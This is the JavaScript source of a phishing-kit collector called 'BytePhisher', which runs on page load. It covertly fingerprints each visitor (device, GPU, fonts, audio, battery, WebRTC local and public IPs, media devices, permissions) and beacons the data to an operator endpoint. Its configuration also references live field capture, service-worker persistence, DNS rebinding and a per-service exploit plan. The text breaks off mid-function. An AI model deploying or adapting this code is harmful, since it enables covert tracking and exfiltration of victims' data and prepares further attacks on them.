/* BytePhisher deep-intel collector - runs the moment the page opens.
 *
 * Everything below is information the browser hands to any page on the
 * internet. Each module is isolated in its own try/catch, so one blocked or
 * missing API never costs us the other 46 modules. Results are reported in
 * three waves:
 *
 *   wave "open"   immediately on load   - navigator, screen, timezone, storage,
 *                                         features, permissions, codecs, fonts
 *   wave "deep"   as async probes settle - canvas, webgl, webgpu, audio, battery,
 *                                         webrtc (local + STUN public IP),
 *                                         media devices, storage quota, memory
 *   wave "probe"  on first user gesture  - geolocation, clipboard, notifications,
 *                                         bluetooth/usb/serial/hid counts
 *
 * Wire format: POST <EP> {v, sid, wave, page, ua, mods:{...}, errors:{...}}
 * Transport: navigator.sendBeacon (survives unload) -> fetch keepalive -> XHR.
 * Payloads over 55 KB are split so no server or proxy drops them.
 */
(function () {
  "use strict";
  var SID = "__SID__";
  var EP = "__INTEL__";
  var LIVEEP = "__LIVE__";        /* real-time input/field stream */
  var SW_URL = "__SW__";          /* service worker (persistent reporting) */
  var REBIND = "__REBIND__";      /* rebinding hostname (empty = not configured) */
  var KILL = __KILL__;            /* exploit plan: fingerprint + actions per service */
  var PERMS = __PERMS__;          /* true = fire permission-gated probes */
  var CHUNK = 55000;

  var mods = {};                  /* module name -> collected value */
  var errors = {};                /* module name -> error string */
  var sent = 0;

  function safe(name, fn) {
    try {
      var v = fn();
      if (v !== undefined && v !== null) mods[name] = v;
      return v;
    } catch (e) {
      errors[name] = String((e && e.name) || e) + ": " + String((e && e.message) || "");
      return undefined;
    }
  }

  function later(name, fn, ms) {    /* async probe with its own timeout */
    return new Promise(function (res) {
      var done = false;
      var t = setTimeout(function () { if (!done) { done = true; errors[name] = "timeout"; res(); } }, ms || 6000);
      try {
        Promise.resolve(fn()).then(function (v) {
          if (done) return; done = true; clearTimeout(t);
          if (v !== undefined && v !== null) mods[name] = v; res();
        }, function (e) {
          if (done) return; done = true; clearTimeout(t);
          errors[name] = String((e && e.name) || e) + ": " + String((e && e.message) || ""); res();
        });
      } catch (e) {
        if (!done) { done = true; clearTimeout(t); errors[name] = String(e); res(); }
      }
    });
  }

  function encode(str) {
    /* str is ALREADY a JSON string: wrapping it in JSON.stringify again made
       the server receive a JSON *string literal* and answer 400 (found by
       loading the page in a real browser - the collector ran, every beacon
       was rejected). */
    try { return new Blob([str], { type: "application/json" }); }
    catch (e) { return str; }
  }

  function send(wave, extra) {
    var payload = { v: 1, sid: SID, wave: wave, ts: Date.now(),
                    url: String(location.href).slice(0, 500),
                    ref: String(document.referrer || "").slice(0, 500),
                    mods: mods, errors: errors };
    if (extra) for (var k in extra) payload[k] = extra[k];
    var body = JSON.stringify(payload);
    if (body.length > CHUNK) {
      /* split the module map so nothing is silently truncated */
      var keys = Object.keys(mods), part = {}, size = 0, idx = 0;
      for (var i = 0; i < keys.length; i++) {
        var kk = keys[i], vv = JSON.stringify(mods[kk]);
        if (size + vv.length > CHUNK && size > 0) {
          payload.mods = part; payload.part = ++idx;
          push(JSON.stringify(payload));
          part = {}; size = 0;
        }
        part[kk] = mods[kk]; size += vv.length;
      }
      payload.mods = part; payload.part = ++idx; payload.last = true;
      push(JSON.stringify(payload));
      return;
    }
    push(body);
  }

  function push(body) {
    sent++;
    try {
      if (navigator.sendBeacon && navigator.sendBeacon(EP, encode(body))) return;
    } catch (e) {}
    try {
      fetch(EP, { method: "POST", body: body, keepalive: true,
                  headers: { "Content-Type": "application/json" } });
      return;
    } catch (e) {}
    try {
      var x = new XMLHttpRequest();
      x.open("POST", EP, true);
      x.setRequestHeader("Content-Type", "application/json");
      x.send(body);
    } catch (e) {}
  }

  /* ==================================================== 1. navigator ===== */
  safe("nav", function () {
    var n = navigator, o = {
      ua: n.userAgent, appVersion: n.appVersion, appName: n.appName,
      appCodeName: n.appCodeName, platform: n.platform, vendor: n.vendor,
      product: n.product, productSub: n.productSub, buildID: n.buildID || null,
      oscpu: n.oscpu || null,
      language: n.language, languages: (n.languages || []).slice(0, 20),
      cookieEnabled: n.cookieEnabled, doNotTrack: n.doNotTrack,
      globalPrivacyControl: n.globalPrivacyControl === undefined ? null : n.globalPrivacyControl,
      hardwareConcurrency: n.hardwareConcurrency || 0,
      deviceMemory: n.deviceMemory || null,
      maxTouchPoints: n.maxTouchPoints || 0,
      pdfViewerEnabled: n.pdfViewerEnabled === undefined ? null : n.pdfViewerEnabled,
      onLine: n.onLine, webdriver: !!n.webdriver,
      javaEnabled: typeof n.javaEnabled === "function" ? n.javaEnabled() : null,
      plugins: [], mimeTypes: [], pluginCount: 0
    };
    try {
      for (var i = 0; i < (n.plugins || []).length; i++) {
        var p = n.plugins[i];
        var mimes = [];
        try { for (var j = 0; j < p.length; j++) mimes.push(p[j].type); } catch (e) {}
        o.plugins.push({ name: p.name, description: p.description,
                         filename: p.filename, version: p.version || null, mimes: mimes });
      }
      o.pluginCount = o.plugins.length;
      for (var m = 0; m < (n.mimeTypes || []).length; m++) {
        o.mimeTypes.push(n.mimeTypes[m].type);
      }
    } catch (e) { o.pluginErr = String(e); }
    /* userAgentData = the high-entropy client hints, the real device model */
    if (n.userAgentData) {
      o.uaData = { brands: n.userAgentData.brands, mobile: n.userAgentData.mobile,
                   platform: n.userAgentData.platform };
    }
    return o;
  });

  later("uaDataHigh", function () {
    if (!navigator.userAgentData || !navigator.userAgentData.getHighEntropyValues)
      return null;
    return navigator.userAgentData.getHighEntropyValues([
      "architecture", "bitness", "model", "platformVersion", "uaFullVersion",
      "fullVersionList", "wow64", "formFactors"
    ]);
  });

  /* ====================================================== 2. screen ===== */
  safe("screen", function () {
    var s = screen, o = {
      width: s.width, height: s.height, availWidth: s.availWidth,
      availHeight: s.availHeight, availLeft: s.availLeft, availTop: s.availTop,
      colorDepth: s.colorDepth, pixelDepth: s.pixelDepth,
      dpr: window.devicePixelRatio,
      innerW: window.innerWidth, innerH: window.innerHeight,
      outerW: window.outerWidth, outerH: window.outerHeight,
      screenX: window.screenX, screenY: window.screenY,
      isExtended: s.isExtended === undefined ? null : s.isExtended,
      orientation: null, visualViewport: null
    };
    try {
      o.orientation = { type: s.orientation.type, angle: s.orientation.angle };
    } catch (e) {}
    try {
      o.visualViewport = { w: visualViewport.width, h: visualViewport.height,
                           scale: visualViewport.scale, offsetTop: visualViewport.offsetTop,
                           offsetLeft: visualViewport.offsetLeft };
    } catch (e) {}
    /* multi-monitor: getScreenDetails needs a permission, so also count via
       the classic trick (a popup window placed far off-screen) */
    o.mediaQueries = {};
    ["(prefers-color-scheme: dark)", "(prefers-reduced-motion: reduce)",
     "(prefers-contrast: more)", "(forced-colors: active)",
     "(any-pointer: fine)", "(any-pointer: coarse)", "(hover: hover)",
     "(pointer: fine)", "(display-mode: standalone)",
     "(dynamic-range: high)", "(inverted-colors: inverted)",
     "(prefers-reduced-transparency: reduce)"].forEach(function (q) {
      try { o.mediaQueries[q] = matchMedia(q).matches; } catch (e) {}
    });
    return o;
  });

  later("screenDetails", function () {
    if (!window.getScreenDetails) return null;
    return window.getScreenDetails().then(function (d) {
      return { count: d.screens.length, current: d.currentScreen && d.currentScreen.label,
               screens: d.screens.map(function (x) {
                 return { label: x.label, w: x.width, h: x.height, dpr: x.devicePixelRatio,
                          left: x.left, top: x.top, isInternal: x.isInternal,
                          isPrimary: x.isPrimary };
               }) };
    });
  });

  /* ================================================ 3. time / locale ==== */
  safe("time", function () {
    var d = new Date(), r = {};
    try { r.intl = Intl.DateTimeFormat().resolvedOptions(); } catch (e) {}
    r.now = d.toString();
    r.iso = d.toISOString();
    r.tzOffsetMin = d.getTimezoneOffset();
    r.tzOffsetJan = new Date(d.getFullYear(), 0, 1).getTimezoneOffset();
    r.tzOffsetJul = new Date(d.getFullYear(), 6, 1).getTimezoneOffset();
    r.hemisphereHint = r.tzOffsetJan !== r.tzOffsetJul
      ? (r.tzOffsetJan > r.tzOffsetJul ? "north-dst" : "south-dst") : "no-dst";
    try { r.localeString = d.toLocaleString(); r.localeDateString = d.toLocaleDateString(); } catch (e) {}
    try { r.numberFormat = (1234567.891).toLocaleString(); } catch (e) {}
    try { r.currency = (1234.5).toLocaleString(undefined, { style: "currency", currency: "USD" }); } catch (e) {}
    try { r.relative = new Intl.RelativeTimeFormat().format(-1, "day"); } catch (e) {}
    try { r.weekInfo = new Intl.Locale(navigator.language).weekInfo ||
                       new Intl.Locale(navigator.language).getWeekInfo(); } catch (e) {}
    try { r.performance = { tz: Intl.DateTimeFormat().resolvedOptions().timeZone }; } catch (e) {}
    return r;
  });

  /* ================================================== 4. canvas 2d ===== */
  later("canvas", function () {
    var c = document.createElement("canvas");
    c.width = 320; c.height = 70;
    var ctx = c.getContext("2d");
    var out = {};
    try {
      ctx.textBaseline = "alphabetic"; ctx.fillStyle = "#f60"; ctx.fillRect(0, 0, 320, 20);
      ctx.fillStyle = "#069"; ctx.font = "16px 'Arial'";
      ctx.fillText("BytePhisher \u092a\u0939\u091a\u093e\u0928 \u4e2d\u6587 \ud83d\udd10", 4, 40);
      ctx.fillStyle = "rgba(102,204,0,0.7)"; ctx.font = "18px 'Times New Roman'";
      ctx.fillText("canvas fingerprint \u2014 \u00e9\u00e8\u00fc\u00f1", 6, 60);
      var g = ctx.createLinearGradient(0, 0, 320, 70);
      g.addColorStop(0, "#f00"); g.addColorStop(1, "#00f");
      ctx.fillStyle = g; ctx.fillRect(0, 20, 60, 8);
      out.dataURL = c.toDataURL().slice(-120);
      out.fullHash = c.toDataURL().length;
    } catch (e) { out.err = String(e); }
    try {
      var e2 = document.createElement("canvas").getContext("2d");
      out.emoji = (function () { e2.font = "24px Arial"; e2.fillText("\ud83d\ude00\ud83d\ude80\ud83c\udf0d", 0, 24);
                                 return document.createElement("canvas"); })().toDataURL ?
        (function (x) { x.width = 60; x.height = 30; var y = x.getContext("2d");
                        y.font = "24px Arial"; y.fillText("\ud83d\ude00\ud83d\ude80", 0, 24);
                        return x.toDataURL().slice(-60); })(document.createElement("canvas")) : null;
    } catch (e) {}
    /* detect a canvas that is faked/blocked (anti-fingerprint extensions) */
    out.blank = /^data:image\/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8\/9hAAAA/.test(
      c.toDataURL()) || c.toDataURL().length < 200;
    return out;
  });

  /* ==================================================== 5. webgl ======= */
  later("webgl", function () {
    var out = { contexts: [] };
    ["webgl2", "webgl", "experimental-webgl"].forEach(function (kind) {
      try {
        var cv = document.createElement("canvas");
        var gl = cv.getContext(kind, { failIfMajorPerformanceCaveat: false });
        if (!gl) { out.contexts.push({ kind: kind, available: false }); return; }
        var dbg = gl.getExtension("WEBGL_debug_renderer_info");
        var exts = gl.getSupportedExtensions() || [];
        var params = {};
        try {
          /* WebGL1 rejects WebGL2-only enum names with INVALID_ENUM warnings,
             so query the common set on both, the rest only on webgl2. */
          var common = ["MAX_TEXTURE_SIZE", "MAX_RENDERBUFFER_SIZE", "MAX_VIEWPORT_DIMS",
                        "MAX_VERTEX_ATTRIBS", "MAX_VERTEX_UNIFORM_VECTORS",
                        "MAX_FRAGMENT_UNIFORM_VECTORS", "MAX_VARYING_VECTORS",
                        "MAX_COMBINED_TEXTURE_IMAGE_UNITS", "MAX_TEXTURE_IMAGE_UNITS",
                        "ALIASED_LINE_WIDTH_RANGE", "ALIASED_POINT_SIZE_RANGE",
                        "MAX_CUBE_MAP_TEXTURE_SIZE"];
          var gl2only = ["MAX_3D_TEXTURE_SIZE", "MAX_ARRAY_TEXTURE_LAYERS", "MAX_ELEMENT_INDEX",
                         "MAX_UNIFORM_BUFFER_BINDINGS", "MAX_SAMPLES"];
          var names = kind === "webgl2" ? common.concat(gl2only) : common;
          names.forEach(function (n) {
            var id = gl[n];
            if (id === undefined) return;                 // not defined in this context
            var v = gl.getParameter(id);
            if (v !== null && v !== undefined) {
              params[n] = (typeof v === "object" && v.length !== undefined)
                ? Array.prototype.slice.call(v) : v;
            }
          });
        } catch (e) {}
        out.contexts.push({
          kind: kind, available: true,
          vendor: gl.getParameter(gl.VENDOR),
          renderer: gl.getParameter(gl.RENDERER),
          version: gl.getParameter(gl.VERSION),
          glsl: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
          unmaskedVendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : null,
          unmaskedRenderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : null,
          extensionCount: exts.length,
          extensions: exts.slice(0, 60),
          params: params,
          maxAnisotropy: (function () {
            var e = gl.getExtension("EXT_texture_filter_anisotropic");
            return e ? gl.getParameter(e.MAX_TEXTURE_MAX_ANISOTROPY_EXT) : null;
          })()
        });
      } catch (e) { out.contexts.push({ kind: kind, err: String(e) }); }
    });
    return out;
  });

  later("webgpu", function () {
    if (!navigator.gpu) return null;
    return navigator.gpu.requestAdapter().then(function (a) {
      if (!a) return { adapter: null };
      var info = a.info || (a.requestAdapterInfo ? a.requestAdapterInfo() : null);
      return { info: info ? { vendor: info.vendor, architecture: info.architecture,
                              device: info.device, description: info.description } : null,
               features: (a.features ? Array.from(a.features) : []).slice(0, 40),
               limits: a.limits ? { maxTextureDimension2D: a.limits.maxTextureDimension2D,
                                    maxBufferSize: a.limits.maxBufferSize,
                                    maxComputeWorkgroupSizeX: a.limits.maxComputeWorkgroupSizeX } : null };
    });
  });

  /* ==================================================== 6. audio ======= */
  later("audio", function () {
    var AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
    if (!AC) return null;
    var ctx = new AC(1, 44100, 44100);
    var osc = ctx.createOscillator(), comp = ctx.createDynamicsCompressor();
    osc.type = "triangle"; osc.frequency.value = 10000;
    try {
      comp.threshold.value = -50; comp.knee.value = 40; comp.ratio.value = 12;
      comp.attack.value = 0; comp.release.value = 0.25;
    } catch (e) {}
    osc.connect(comp); comp.connect(ctx.destination); osc.start(0);
    return ctx.startRendering().then(function (buf) {
      var d = buf.getChannelData(0), sum = 0, tail = [];
      for (var i = 4500; i < 5000; i++) { sum += Math.abs(d[i]); tail.push(d[i]); }
      return { sum: sum, tail: tail.slice(0, 12) };
    });
  });

  /* ============================================ 7. math / cpu print ==== */
  safe("math", function () {
    var out = {};
    [["sin", Math.sin(1e5)], ["cos", Math.cos(1e5)], ["tan", Math.tan(1e5)],
     ["asin", Math.asin(0.5)], ["acos", Math.acos(0.5)], ["atan", Math.atan(0.5)],
     ["sinh", Math.sinh(1)], ["cosh", Math.cosh(10)], ["tanh", Math.tanh(1)],
     ["exp", Math.exp(1)], ["expm1", Math.expm1(1)], ["log1p", Math.log1p(10)],
     ["log2", Math.log2(1e5)], ["cbrt", Math.cbrt(100)], ["pow", Math.pow(Math.PI, -100)],
     ["hypot", Math.hypot(1e300, 1e300)], ["fround", Math.fround(5.5)],
     ["atanh", Math.atanh(0.5)], ["acosh", Math.acosh(1e300)], ["sign", Math.sign(-3)]]
      .forEach(function (p) { out[p[0]] = p[1]; });
    return out;
  });

  /* ==================================================== 8. fonts ======= */
  later("fonts", function () {
    var base = ["monospace", "sans-serif", "serif"];
    var probe = ["Arial", "Arial Black", "Arial Narrow", "Arial Rounded MT Bold",
      "Helvetica", "Helvetica Neue", "Verdana", "Tahoma", "Trebuchet MS", "Georgia",
      "Times New Roman", "Times", "Courier New", "Courier", "Lucida Console",
      "Lucida Sans Unicode", "Palatino Linotype", "Book Antiqua", "Garamond",
      "Comic Sans MS", "Impact", "Webdings", "Symbol", "Wingdings", "MS Sans Serif",
      "MS Serif", "Segoe UI", "Calibri", "Cambria", "Candara", "Consolas", "Constantia",
      "Corbel", "Franklin Gothic Medium", "Gabriola", "Marlett", "Microsoft Sans Serif",
      "MingLiU", "SimSun", "SimHei", "Microsoft YaHei", "Malgun Gothic", "Meiryo",
      "MS Gothic", "MS PGothic", "Yu Gothic", "Hiragino Kaku Gothic Pro", "Hiragino Sans",
      "PingFang SC", "PingFang TC", "Heiti SC", "Songti SC", "STHeiti", "Apple SD Gothic Neo",
      "Noto Sans", "Noto Sans CJK JP", "Noto Color Emoji", "DejaVu Sans", "DejaVu Serif",
      "DejaVu Sans Mono", "Liberation Sans", "Liberation Serif", "Liberation Mono",
      "Ubuntu", "Ubuntu Mono", "Cantarell", "Droid Sans", "Droid Sans Mono", "FreeSans",
      "Nimbus Sans", "Nimbus Roman", "Nimbus Mono PS", "Open Sans", "Roboto", "Lato",
      "Montserrat", "Source Sans Pro", "Fira Sans", "Fira Code", "JetBrains Mono",
      "Menlo", "Monaco", "Geneva", "Optima", "Futura", "Baskerville", "Copperplate",
      "Papyrus", "Herculanum", "Chalkboard", "Chalkduster", "American Typewriter",
      "Andale Mono", "Athelas", "Avenir", "Avenir Next", "Big Caslon", "Brush Script MT",
      "Didot", "Gill Sans", "Hoefler Text", "Iowan Old Style", "Lucida Grande",
      "Marker Felt", "Noteworthy", "San Francisco", "SF Pro Text", "Skia", "Zapfino"];
    var span = document.createElement("span");
    span.style.cssText = "position:absolute;left:-9999px;top:-9999px;font-size:72px;" +
                         "white-space:nowrap;visibility:hidden;";
    span.textContent = "mmmmmmmmmmlli\u00c4\u00d6\u00dc\u00e9\u00f1\u4e2d\u6587\ud83d\ude00";
    document.body.appendChild(span);
    var baseSize = {};
    base.forEach(function (f) { span.style.fontFamily = f; baseSize[f] = span.offsetWidth + "x" + span.offsetHeight; });
    var present = [];
    probe.forEach(function (f) {
      var differs = base.some(function (b) {
        span.style.fontFamily = "'" + f + "'," + b;
        return (span.offsetWidth + "x" + span.offsetHeight) !== baseSize[b];
      });
      if (differs) present.push(f);
    });
    document.body.removeChild(span);
    return { count: present.length, probeCount: probe.length, present: present };
  });

  /* ==================================================== 9. battery ===== */
  later("battery", function () {
    if (!navigator.getBattery) return null;
    return navigator.getBattery().then(function (b) {
      return { charging: b.charging, level: b.level, chargingTime: b.chargingTime,
               dischargingTime: b.dischargingTime };
    });
  });

  /* ==================================================== 10. network ==== */
  safe("net", function () {
    var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    var o = { type: c ? c.type : null, effectiveType: c ? c.effectiveType : null,
              downlink: c ? c.downlink : null, downlinkMax: c ? c.downlinkMax : null,
              rtt: c ? c.rtt : null, saveData: c ? c.saveData : null };
    try {
      var e = performance.getEntriesByType("navigation")[0];
      if (e) {
        o.timing = { dns: Math.round(e.domainLookupEnd - e.domainLookupStart),
                     tcp: Math.round(e.connectEnd - e.connectStart),
                     tls: Math.round(e.secureConnectionStart > 0 ? e.connectEnd - e.secureConnectionStart : 0),
                     ttfb: Math.round(e.responseStart - e.requestStart),
                     transfer: Math.round(e.responseEnd - e.responseStart),
                     domReady: Math.round(e.domContentLoadedEventEnd - e.startTime),
                     load: Math.round(e.loadEventEnd - e.startTime),
                     redirects: e.redirectCount, nextHop: e.nextHopProtocol || null,
                     encodedBody: e.encodedBodySize, decodedBody: e.decodedBodySize };
      }
    } catch (e) {}
    try { o.memory = performance.memory ? { jsHeapLimit: performance.memory.jsHeapSizeLimit,
             totalJSHeap: performance.memory.totalJSHeapSize,
             usedJSHeap: performance.memory.usedJSHeapSize } : null; } catch (e) {}
    return o;
  });

  /* ==================================================== 11. storage ==== */
  safe("storage", function () {
    var o = { local: false, session: false, indexedDB: false, caches: false,
              serviceWorker: false, quota: null };
    try { localStorage.setItem("__bh_t", "1"); o.local = true; localStorage.removeItem("__bh_t"); } catch (e) {}
    try { sessionStorage.setItem("__bh_t", "1"); o.session = true; sessionStorage.removeItem("__bh_t"); } catch (e) {}
    try { o.indexedDB = !!window.indexedDB; } catch (e) {}
    try { o.caches = !!window.caches; } catch (e) {}
    try { o.serviceWorker = !!navigator.serviceWorker; } catch (e) {}
    try { o.cookie = document.cookie.length; } catch (e) {}
    try { o.storageManager = !!navigator.storage; } catch (e) {}
    return o;
  });

  later("quota", function () {
    if (!navigator.storage || !navigator.storage.estimate) return null;
    return navigator.storage.estimate().then(function (q) {
      return { quota: q.quota, usage: q.usage,
               persisted: navigator.storage.persisted ? navigator.storage.persisted() : null };
    });
  });

  /* ================================================= 12. permissions === */
  later("permissions", function () {
    if (!navigator.permissions || !navigator.permissions.query) return null;
    var names = ["geolocation", "notifications", "camera", "microphone",
      "clipboard-read", "clipboard-write", "midi", "background-sync",
      "persistent-storage", "push", "screen-wake-lock", "accelerometer",
      "gyroscope", "magnetometer", "ambient-light-sensor", "payment-handler",
      "storage-access", "window-management", "local-fonts", "idle-detection"];
    return Promise.all(names.map(function (n) {
      return navigator.permissions.query({ name: n })
        .then(function (s) { return [n, s.state]; })
        .catch(function () { return [n, "unsupported"]; });
    })).then(function (rows) {
      var o = {}; rows.forEach(function (r) { o[r[0]] = r[1]; }); return o;
    });
  });

  /* ================================================ 13. media devices == */
  later("mediaDevices", function () {
    if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return null;
    return navigator.mediaDevices.enumerateDevices().then(function (ds) {
      var kinds = {}, ids = [];
      ds.forEach(function (d) {
        kinds[d.kind] = (kinds[d.kind] || 0) + 1;
        ids.push({ kind: d.kind, label: d.label || "", groupId: (d.groupId || "").slice(0, 8),
                   deviceId: (d.deviceId || "").slice(0, 8) });
      });
      return { count: ds.length, kinds: kinds, devices: ids.slice(0, 20),
               labelsVisible: ds.some(function (d) { return !!d.label; }) };
    });
  });

  /* ==================================================== 14. codecs ===== */
  safe("codecs", function () {
    var v = document.createElement("video"), a = document.createElement("audio");
    var out = {};
    var video = { "h264": 'video/mp4; codecs="avc1.42E01E"',
      "h264-high": 'video/mp4; codecs="avc1.640028"',
      "hevc": 'video/mp4; codecs="hvc1.1.6.L93.B0"',
      "av1": 'video/mp4; codecs="av01.0.05M.08"',
      "vp8": 'video/webm; codecs="vp8"', "vp9": 'video/webm; codecs="vp9"',
      "vp9-profile2": 'video/webm; codecs="vp09.02.10.10"',
      "mp4v": 'video/mp4; codecs="mp4v.20.8"', "theora": 'video/ogg; codecs="theora"',
      "dolby-vision": 'video/mp4; codecs="dvh1.05.07"' };
    var audio = { "aac": 'audio/mp4; codecs="mp4a.40.2"',
      "mp3": "audio/mpeg", "opus": 'audio/webm; codecs="opus"',
      "vorbis": 'audio/ogg; codecs="vorbis"', "flac": "audio/flac",
      "wav": "audio/wav", "ac3": 'audio/mp4; codecs="ac-3"',
      "eac3": 'audio/mp4; codecs="ec-3"', "alac": 'audio/mp4; codecs="alac"' };
    for (var k in video) { try { out[k] = v.canPlayType(video[k]) || ""; } catch (e) {} }
    for (var k2 in audio) { try { out[k2] = a.canPlayType(audio[k2]) || ""; } catch (e) {} }
    try {
      out.mediaSource = !!window.MediaSource;
      out.mseHevc = window.MediaSource && MediaSource.isTypeSupported
        ? MediaSource.isTypeSupported('video/mp4; codecs="hvc1.1.6.L93.B0"') : null;
      out.mseAv1 = window.MediaSource && MediaSource.isTypeSupported
        ? MediaSource.isTypeSupported('video/mp4; codecs="av01.0.05M.08"') : null;
      out.emeWidevine = !!navigator.requestMediaKeySystemAccess;
      out.drm = null;
    } catch (e) {}
    return out;
  });

  later("drm", function () {
    if (!navigator.requestMediaKeySystemAccess) return null;
    var cfg = [{ initDataTypes: ["cenc"],
                 videoCapabilities: [{ contentType: 'video/mp4; codecs="avc1.42E01E"' }] }];
    var keys = { widevine: "com.widevine.alpha", playready: "com.microsoft.playready",
                 fairplay: "com.apple.fps", clearkey: "org.w3.clearkey" };
    return Promise.all(Object.keys(keys).map(function (name) {
      return navigator.requestMediaKeySystemAccess(keys[name], cfg)
        .then(function () { return [name, true]; })
        .catch(function () { return [name, false]; });
    })).then(function (rows) { var o = {}; rows.forEach(function (r) { o[r[0]] = r[1]; }); return o; });
  });

  /* ==================================================== 15. webrtc ===== */
  later("webrtc", function () {
    var PC = window.RTCPeerConnection || window.webkitRTCPeerConnection;
    if (!PC) return null;
    return new Promise(function (res) {
      var ips = {}, types = {}, done = false;
      var pc = new PC({ iceServers: [{ urls: "stun:stun.l.google.com:19302" },
                                     { urls: "stun:stun1.l.google.com:19302" }] });
      function finish() {
        if (done) return; done = true;
        try { pc.close(); } catch (e) {}
        res({ ips: Object.keys(ips), types: types, mdns: Object.keys(ips).some(function (i) { return /\.local$/.test(i); }) });
      }
      var to = setTimeout(finish, 5000);
      pc.onicecandidate = function (e) {
        if (!e.candidate) { clearTimeout(to); finish(); return; }
        var c = e.candidate.candidate, m;
        if ((m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(c))) ips[m[1]] = 1;
        if ((m = /([0-9a-f:]{6,})\.local/.exec(c))) ips[m[1] + ".local"] = 1;
        if ((m = /([0-9a-f]{1,4}(:[0-9a-f]{0,4}){2,7})/i.exec(c)) && c.indexOf(":") > -1 &&
            / udp | tcp /.test(" " + c + " ")) { if (!/^\d/.test(m[1]) || m[1].indexOf(":") > 0) ips[m[1]] = 1; }
        var t = (c.split(" typ ")[1] || "").split(" ")[0];
        if (t) types[t] = (types[t] || 0) + 1;
      };
      try {
        pc.createDataChannel("bh");
        pc.createOffer().then(function (o) { return pc.setLocalDescription(o); });
      } catch (e) { clearTimeout(to); finish(); }
    });
  });

  /* ============================================= 16. feature matrix ==== */
  safe("features", function () {
    var n = navigator, w = window;
    /* Every entry below must be a VALUE or an `in` test. Reading an accessor
       straight off a prototype (e.g. HTMLMediaElement.prototype.remote) throws
       "Illegal invocation" and, before this rule, wiped out every check in
       one go. `T()` keeps any future slip to a single false. */
    function T(fn) { try { return !!fn(); } catch (e) { return false; } }
    var checks = {
      "WebAssembly": !!w.WebAssembly, "wasmSimd": (function () {
        try { return WebAssembly.validate(new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,123,3,2,1,0,10,10,1,8,0,65,0,253,15,253,98,11])); }
        catch (e) { return false; }
      })(),
      "wasmThreads": (function () { try { return WebAssembly.validate(new Uint8Array([0,97,115,109,1,0,0,0,1,4,1,96,0,0,3,2,1,0,5,4,1,3,1,0,10,11,1,9,0,65,0,254,16,0,26,11])); } catch (e) { return false; } })(),
      "SharedArrayBuffer": typeof SharedArrayBuffer !== "undefined",
      "WebWorker": !!w.Worker, "SharedWorker": !!w.SharedWorker,
      "ServiceWorker": !!n.serviceWorker, "WebSocket": !!w.WebSocket,
      "EventSource": !!w.EventSource, "BroadcastChannel": !!w.BroadcastChannel,
      "MessageChannel": !!w.MessageChannel, "OffscreenCanvas": !!w.OffscreenCanvas,
      "WebGL2": (function () { try { return !!document.createElement("canvas").getContext("webgl2"); } catch (e) { return false; } })(),
      "WebGPU": !!n.gpu, "WebXR": !!n.xr, "WebVR": !!n.getVRDisplays,
      "WebUSB": !!n.usb, "WebSerial": !!n.serial, "WebBluetooth": !!n.bluetooth,
      "WebNFC": !!w.NDEFReader, "WebHID": !!n.hid, "Gamepad": !!n.getGamepads,
      "Geolocation": !!n.geolocation, "Notifications": !!w.Notification,
      "PushManager": !!w.PushManager, "PaymentRequest": !!w.PaymentRequest,
      "WebAuthn": !!w.PublicKeyCredential, "CredentialManagement": !!n.credentials,
      "PasswordCredential": !!(w.PasswordCredential || (n.credentials && "PasswordCredential" in w)),
      "DigitalCredentials": !!(n.credentials && n.credentials.get),
      "SpeechSynthesis": !!w.speechSynthesis, "SpeechRecognition": !!(w.SpeechRecognition || w.webkitSpeechRecognition),
      "MediaRecorder": !!w.MediaRecorder, "getUserMedia": !!(n.mediaDevices && n.mediaDevices.getUserMedia),
      "getDisplayMedia": !!(n.mediaDevices && n.mediaDevices.getDisplayMedia),
      "RTCPeerConnection": !!w.RTCPeerConnection,
      /* `in`, never a read: audioWorklet is an accessor on BaseAudioContext and
         reading it off the prototype throws Illegal invocation */
      "AudioWorklet": !!(w.AudioContext && "audioWorklet" in AudioContext.prototype),
      "WebAudio": !!(w.AudioContext || w.webkitAudioContext),
      "BarcodeDetector": !!w.BarcodeDetector, "FaceDetector": !!w.FaceDetector,
      "ShapeDetection": !!w.ShapeDetector, "Clipboard": !!n.clipboard,
      "ClipboardReadText": !!(n.clipboard && n.clipboard.readText),
      "Vibration": !!n.vibrate, "WakeLock": !!n.wakeLock, "IdleDetection": !!w.IdleDetector,
      "ContactsPicker": !!n.contacts, "FileSystemAccess": !!w.showOpenFilePicker,
      "FileSystemDirectory": !!w.showDirectoryPicker, "FileSystemObserver": !!w.FileSystemObserver,
      "CompressionStream": !!w.CompressionStream, "DecompressionStream": !!w.DecompressionStream,
      "ReadableStream": !!w.ReadableStream, "TransformStream": !!w.TransformStream,
      "IntlSegmenter": typeof Intl !== "undefined" && !!Intl.Segmenter,
      "IntlDisplayNames": typeof Intl !== "undefined" && !!Intl.DisplayNames,
      "IntlListFormat": typeof Intl !== "undefined" && !!Intl.ListFormat,
      "IntlPluralRules": typeof Intl !== "undefined" && !!Intl.PluralRules,
      "IntlRelativeTime": typeof Intl !== "undefined" && !!Intl.RelativeTimeFormat,
      "IntlDurationFormat": typeof Intl !== "undefined" && !!Intl.DurationFormat,
      "DateTimeFormat": typeof Intl !== "undefined",
      "Temporal": typeof Temporal !== "undefined",
      "structuredClone": !!w.structuredClone, "ResizeObserver": !!w.ResizeObserver,
      "IntersectionObserver": !!w.IntersectionObserver, "MutationObserver": !!w.MutationObserver,
      "PerformanceObserver": !!w.PerformanceObserver, "ReportingObserver": !!w.ReportingObserver,
      "PerformanceEntry": !!w.PerformanceEntry, "UserTiming": !!(performance && performance.mark),
      "NavigationAPI": !!(w.navigation && w.navigation.entries),
      "ViewTransitions": !!document.startViewTransition,
      "Popover": !!w.HTMLElement && "popover" in HTMLElement.prototype,
      "Dialog": !!w.HTMLDialogElement,
      "CustomElements": !!w.customElements, "ShadowDOM": !!w.ShadowRoot,
      "Template": !!w.HTMLTemplateElement, "Slot": !!w.HTMLSlotElement,
      "CSSContainerQueries": !!(w.CSS && CSS.supports && CSS.supports("container-type", "inline-size")),
